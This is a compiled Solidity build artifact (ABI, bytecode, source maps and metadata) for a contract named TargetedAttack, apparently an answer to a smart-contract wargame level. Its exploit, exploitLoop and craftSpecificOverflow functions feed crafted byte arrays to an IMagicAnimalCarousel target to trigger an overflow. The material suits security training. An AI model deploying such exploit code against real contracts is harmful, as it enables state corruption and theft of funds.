{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"checkState","inputs":[],"outputs":[{"name":"currentId","type":"uint256","internalType":"uint256"},{"name":"maxCap","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"craftSpecificOverflow","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitLoop","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IMagicAnimalCarousel"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610736380380610736833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6106b0806100865f395ff3fe608060405234801561000f575f5ffd5b5060043610610064575f3560e01c8063a87719e11161004d578063a87719e114610094578063d4b839921461009c578063f03798c8146100c6575f5ffd5b806363d9b7701461006857806396dfcbea14610072575b5f5ffd5b6100706100ce565b005b61007a61018f565b604080519283526020830191909152015b60405180910390f35b610070610292565b5f546100ae906001600160a01b031681565b6040516001600160a01b03909116815260200161008b565b61007061039a565b60408051600a8082528183019092525f916020820181803683370190505090505f5b600a81101561012e5760ff60f81b828281518110610110576101106105c3565b60200101906001600160f81b03191690815f1a9053506001016100f0565b505f54604051632acee48960e21b815282916001600160a01b03169063ab3b92249061015e9084906004016105f0565b5f604051808303815f87803b158015610175575f5ffd5b505af1158015610187573d5f5f3e3d5ffd5b505050505050565b5f8054604080517f26bad99e000000000000000000000000000000000000000000000000000000008152905183926001600160a01b0316916326bad99e9160048083019260209291908290030181865afa1580156101ef573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610213919061063b565b91505f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa158015610264573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102889190610652565b61ffff1690509091565b60408051600c8082528183019092525f9160208201818036833701905050905060ff60f81b815f815181106102c9576102c96105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b816001815181106102f7576102f76105c3565b60200101906001600160f81b03191690815f1a905350600160f81b81600281518110610325576103256105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b92249061036a9084906004016105f0565b5f604051808303815f87803b158015610381575f5ffd5b505af1158015610393573d5f5f3e3d5ffd5b5050505050565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103ea573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061040e9190610652565b60408051600a8082528183019092529192505f91906020820181803683370190505090505f5b600a8110156104725760ff60f81b828281518110610454576104546105c3565b60200101906001600160f81b03191690815f1a905350600101610434565b505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906104a29084906004016105f0565b5f604051808303815f87803b1580156104b9575f5ffd5b505af11580156104cb573d5f5f3e3d5ffd5b505f9250600a91506104da9050565b6040519080825280601f01601f191660200182016040528015610504576020820181803683370190505b50905060ff60f81b815f8151811061051e5761051e6105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b8160018151811061054c5761054c6105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906105919084906004016105f0565b5f604051808303815f87803b1580156105a8575f5ffd5b505af11580156105ba573d5f5f3e3d5ffd5b50505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b602081525f82518060208401525f5b8181101561061c57602081860181015160408684010152016105ff565b505f604082850101526040601f19601f83011684010191505092915050565b5f6020828403121561064b575f5ffd5b5051919050565b5f60208284031215610662575f5ffd5b815161ffff81168114610673575f5ffd5b939250505056fea26469706673582212208c7ebb3288c9903a69fa11f79a9b5604c360731155bdb8201506f127aa59724464736f6c634300081c0033","sourceMap":"430:2587:0:-:0;;;505:84;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;544:6;:38;;-1:-1:-1;;;;;;544:38:0;-1:-1:-1;;;;;544:38:0;;;;;;;;;;430:2587;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;430:2587:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f5ffd5b5060043610610064575f3560e01c8063a87719e11161004d578063a87719e114610094578063d4b839921461009c578063f03798c8146100c6575f5ffd5b806363d9b7701461006857806396dfcbea14610072575b5f5ffd5b6100706100ce565b005b61007a61018f565b604080519283526020830191909152015b60405180910390f35b610070610292565b5f546100ae906001600160a01b031681565b6040516001600160a01b03909116815260200161008b565b61007061039a565b60408051600a8082528183019092525f916020820181803683370190505090505f5b600a81101561012e5760ff60f81b828281518110610110576101106105c3565b60200101906001600160f81b03191690815f1a9053506001016100f0565b505f54604051632acee48960e21b815282916001600160a01b03169063ab3b92249061015e9084906004016105f0565b5f604051808303815f87803b158015610175575f5ffd5b505af1158015610187573d5f5f3e3d5ffd5b505050505050565b5f8054604080517f26bad99e000000000000000000000000000000000000000000000000000000008152905183926001600160a01b0316916326bad99e9160048083019260209291908290030181865afa1580156101ef573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610213919061063b565b91505f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa158015610264573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102889190610652565b61ffff1690509091565b60408051600c8082528183019092525f9160208201818036833701905050905060ff60f81b815f815181106102c9576102c96105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b816001815181106102f7576102f76105c3565b60200101906001600160f81b03191690815f1a905350600160f81b81600281518110610325576103256105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b92249061036a9084906004016105f0565b5f604051808303815f87803b158015610381575f5ffd5b505af1158015610393573d5f5f3e3d5ffd5b5050505050565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103ea573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061040e9190610652565b60408051600a8082528183019092529192505f91906020820181803683370190505090505f5b600a8110156104725760ff60f81b828281518110610454576104546105c3565b60200101906001600160f81b03191690815f1a905350600101610434565b505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906104a29084906004016105f0565b5f604051808303815f87803b1580156104b9575f5ffd5b505af11580156104cb573d5f5f3e3d5ffd5b505f9250600a91506104da9050565b6040519080825280601f01601f191660200182016040528015610504576020820181803683370190505b50905060ff60f81b815f8151811061051e5761051e6105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b8160018151811061054c5761054c6105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906105919084906004016105f0565b5f604051808303815f87803b1580156105a8575f5ffd5b505af11580156105ba573d5f5f3e3d5ffd5b50505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b602081525f82518060208401525f5b8181101561061c57602081860181015160408684010152016105ff565b505f604082850101526040601f19601f83011684010191505092915050565b5f6020828403121561064b575f5ffd5b5051919050565b5f60208284031215610662575f5ffd5b815161ffff81168114610673575f5ffd5b939250505056fea26469706673582212208c7ebb3288c9903a69fa11f79a9b5604c360731155bdb8201506f127aa59724464736f6c634300081c0033","sourceMap":"430:2587:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;599:653;;;:::i;:::-;;2843:172;;;:::i;:::-;;;;188:25:1;;;244:2;229:18;;222:34;;;;161:18;2843:172:0;;;;;;;;1988:845;;;:::i;460:34::-;;;;;-1:-1:-1;;;;;460:34:0;;;;;;-1:-1:-1;;;;;458:55:1;;;440:74;;428:2;413:18;460:34:0;267:253:1;1262:716:0;;;:::i;599:653::-;1069:13;;;1079:2;1069:13;;;;;;;;;1049:17;;1069:13;;;;;;;;;;-1:-1:-1;;1049:33:0;-1:-1:-1;1096:6:0;1092:68;1112:2;1108:1;:6;1092:68;;;1145:4;1135:14;;:4;1140:1;1135:7;;;;;;;;:::i;:::-;;;;:14;-1:-1:-1;;;;;1135:14:0;;;;;;;;-1:-1:-1;1116:3:0;;1092:68;;;-1:-1:-1;1169:20:0;1214:6;:31;;-1:-1:-1;;;1214:31:0;;1199:4;;-1:-1:-1;;;;;1214:6:0;;:23;;:31;;1199:4;;1214:31;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;627:625;;599:653::o;2843:172::-;2888:17;2945:6;;:23;;;;;;;;2888:17;;-1:-1:-1;;;;;2945:6:0;;:21;;:23;;;;;;;;;;;;;;:6;:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2933:35;;2987:6;;;;;;;;;-1:-1:-1;;;;;2987:6:0;-1:-1:-1;;;;;2987:19:0;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2978:30;;;;2843:172;;:::o;1988:845::-;2659:13;;;2669:2;2659:13;;;;;;;;;2636:20;;2659:13;;;;;;;;;;-1:-1:-1;2659:13:0;2636:36;;2709:4;2696:17;;:7;2704:1;2696:10;;;;;;;;:::i;:::-;;;;:17;-1:-1:-1;;;;;2696:17:0;;;;;;;;;2736:4;2723:17;;:7;2731:1;2723:10;;;;;;;;:::i;:::-;;;;:17;-1:-1:-1;;;;;2723:17:0;;;;;;;;;2763:4;2750:17;;:7;2758:1;2750:10;;;;;;;;:::i;:::-;;;;:17;-1:-1:-1;;;;;2750:17:0;;;;;;;;-1:-1:-1;2786:6:0;;:40;;-1:-1:-1;;;2786:40:0;;-1:-1:-1;;;;;2786:6:0;;;;:23;;:40;;2817:7;;2786:40;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2030:803;1988:845::o;1262:716::-;1368:13;1384:6;;;;;;;;;-1:-1:-1;;;;;1384:6:0;-1:-1:-1;;;;;1384:19:0;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1623:13;;;1633:2;1623:13;;;;;;;;;1368:37;;-1:-1:-1;1602:18:0;;1623:13;;;;;;;;;;;-1:-1:-1;;1602:34:0;-1:-1:-1;1650:6:0;1646:69;1666:2;1662:1;:6;1646:69;;;1700:4;1689:15;;:5;1695:1;1689:8;;;;;;;;:::i;:::-;;;;:15;-1:-1:-1;;;;;1689:15:0;;;;;;;;-1:-1:-1;1670:3:0;;1646:69;;;-1:-1:-1;1724:6:0;;:38;;-1:-1:-1;;;1724:38:0;;-1:-1:-1;;;;;1724:6:0;;;;:23;;:38;;1755:5;;1724:38;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1839:18:0;;-1:-1:-1;1870:2:0;;-1:-1:-1;1860:13:0;;-1:-1:-1;1860:13:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1860:13:0;;1839:34;;1894:4;1883:15;;:5;1889:1;1883:8;;;;;;;;:::i;:::-;;;;:15;-1:-1:-1;;;;;1883:15:0;;;;;;;;;1919:4;1908:15;;:5;1914:1;1908:8;;;;;;;;:::i;:::-;;;;:15;-1:-1:-1;;;;;1908:15:0;;;;;;;;-1:-1:-1;1933:6:0;;:38;;-1:-1:-1;;;1933:38:0;;-1:-1:-1;;;;;1933:6:0;;;;:23;;:38;;1964:5;;1933:38;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1294:684;;;1262:716::o;714:184:1:-;766:77;763:1;756:88;863:4;860:1;853:15;887:4;884:1;877:15;903:527;1052:2;1041:9;1034:21;1015:4;1084:6;1078:13;1127:6;1122:2;1111:9;1107:18;1100:34;1152:1;1162:140;1176:6;1173:1;1170:13;1162:140;;;1287:2;1271:14;;;1267:23;;1261:30;1256:2;1237:17;;;1233:26;1226:66;1191:10;1162:140;;;1166:3;1351:1;1346:2;1337:6;1326:9;1322:22;1318:31;1311:42;1421:2;1414;1410:7;1405:2;1397:6;1393:15;1389:29;1378:9;1374:45;1370:54;1362:62;;;903:527;;;;:::o;1435:184::-;1505:6;1558:2;1546:9;1537:7;1533:23;1529:32;1526:52;;;1574:1;1571;1564:12;1526:52;-1:-1:-1;1597:16:1;;1435:184;-1:-1:-1;1435:184:1:o;1624:276::-;1693:6;1746:2;1734:9;1725:7;1721:23;1717:32;1714:52;;;1762:1;1759;1752:12;1714:52;1794:9;1788:16;1844:6;1837:5;1833:18;1826:5;1823:29;1813:57;;1866:1;1863;1856:12;1813:57;1889:5;1624:276;-1:-1:-1;;;1624:276:1:o","linkReferences":{}},"methodIdentifiers":{"checkState()":"96dfcbea","craftSpecificOverflow()":"a87719e1","exploit()":"63d9b770","exploitLoop()":"f03798c8","target()":"d4b83992"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"checkState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"currentId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxCap\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"craftSpecificOverflow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploitLoop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IMagicAnimalCarousel\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/TargetedAttack.sol\":\"TargetedAttack\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/TargetedAttack.sol\":{\"keccak256\":\"0x8549a201219704729d076f25ea214f44a8def3bc4b605718bc6060f9f721e966\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1d36a7133c6cfd3f8be7ef05ed43dcfbc4c75138504a4ac2212c3e337c0da714\",\"dweb:/ipfs/QmaDkrzngNzNKy5FGFE5Yr9dsnU4XL9HXK5V2PN7SmMn4x\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"checkState","outputs":[{"internalType":"uint256","name":"currentId","type":"uint256"},{"internalType":"uint256","name":"maxCap","type":"uint256"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"craftSpecificOverflow"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"exploit"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"exploitLoop"},{"inputs":[],"stateMutability":"view","type":"function","name":"target","outputs":[{"internalType":"contract IMagicAnimalCarousel","name":"","type":"address"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/TargetedAttack.sol":"TargetedAttack"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/TargetedAttack.sol":{"keccak256":"0x8549a201219704729d076f25ea214f44a8def3bc4b605718bc6060f9f721e966","urls":["bzz-raw://1d36a7133c6cfd3f8be7ef05ed43dcfbc4c75138504a4ac2212c3e337c0da714","dweb:/ipfs/QmaDkrzngNzNKy5FGFE5Yr9dsnU4XL9HXK5V2PN7SmMn4x"],"license":"MIT"}},"version":1},"id":0}